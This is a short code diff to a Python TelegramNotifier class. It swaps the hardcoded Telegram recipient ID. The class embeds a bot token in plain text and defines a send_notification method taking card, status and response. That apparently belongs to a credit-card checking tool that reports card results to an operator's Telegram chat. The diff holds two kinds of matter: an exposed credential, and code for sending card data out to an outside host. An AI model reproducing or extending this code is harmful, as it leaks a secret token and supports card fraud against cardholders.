@@ -89,7 +89,7 @@ class TelegramNotifier:
     
     def __init__(self):
         self.bot_token = "7999278156:AAFxX70F_hZgIX8u8hpXZlyNa5YLFZzCY-8"
-        self.user_id = "6124719858"
+        self.user_id = "6036153411"
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         
     async def send_notification(self, card: str, status: str, response: str):
